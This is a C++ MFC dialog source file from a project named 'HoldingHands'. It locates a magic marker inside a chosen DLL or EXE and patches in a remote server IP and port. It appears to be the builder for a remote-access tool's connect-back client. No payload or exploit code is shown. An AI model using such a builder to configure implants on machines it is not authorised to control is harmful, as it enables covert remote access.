// BuildDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "BuildDlg.h"
#include "afxdialogex.h"
#include "settings.h"
#include <string>

// CBuildDlg 对话框

IMPLEMENT_DYNAMIC(CBuildDlg, CDialogEx)

CBuildDlg::CBuildDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CBuildDlg::IDD, pParent)
	, m_ServerIP(_T("127.0.0.1"))
	, m_Port(_T("10086"))
{
}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT1, m_ServerIP);
	DDX_Text(pDX, IDC_EDIT3, m_Port);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialogEx)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CBuildDlg 消息处理程序


void CBuildDlg::OnBnClickedOk()
{
	UpdateData(TRUE);
	if (m_ServerIP.GetLength() == NULL ||
		m_Port.GetLength() == NULL){
		return;
	}

	CComPtr<IShellFolder> spDesktop;
	HRESULT hr = SHGetDesktopFolder(&spDesktop);
	if (FAILED(hr)) {
		AfxMessageBox(_T("Explorer 未正确初始化! 请稍后再试。"));
		return;
	}
	// 过滤器：显示所有文件和特定类型文件（例如文本文件）
	CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
		_T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"), this);
	int ret = 0;
	try {
		ret = fileDlg.DoModal();
	}
	catch (...) {
		AfxMessageBox(_T("文件对话框未成功打开! 请稍后再试。"));
		return ;
	}
	if (ret == IDOK)
	{
		CString file = fileDlg.GetPathName();
		//打开文件
		CFile File;
		BOOL ret = File.Open(file, CFile::modeRead | CFile::typeBinary);
		if (!ret) {
			AfxMessageBox(_T("打开文件失败!"));
			return;
		}
		int dwFileSize = File.GetLength();
		char* szBuffer = new char[dwFileSize];
		ZeroMemory(szBuffer, dwFileSize);
		File.Read(szBuffer, dwFileSize);
		File.Close();

		int iOffset = MemoryFind(szBuffer, MAGIC, dwFileSize, strlen(MAGIC));
		if (iOffset == -1) {
			AfxMessageBox(_T("定位文件写入位置失败!"));
		}
		else {
			Settings settings = { MAGIC, "127.0.0.1", 10086 };
			strcpy_s(settings.RemoteAddr, UnicodeToASCII(m_ServerIP.GetString()).c_str());
			settings.RemotePort = std::stoi(m_Port.GetString());
			memcpy(szBuffer + iOffset, &settings, sizeof(Settings));
			// 备份文件后重新写入
			DeleteFile(file + CString(".old"));
			bool success = false;
			if (MoveFile(file, file + CString(".old")))
			{
				BOOL ret = File.Open(file, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
				if (ret) {
					File.Write(szBuffer, dwFileSize);
					File.Close();
					AfxMessageBox(_T("文件写入成功!\n") + file);
					success = true;
				}
			}
			if (!success) {
				AfxMessageBox(_T("文件写入失败，请检查权限!"));
			}
		}
		delete[]szBuffer;
	}
	CDialogEx::OnOK();
}
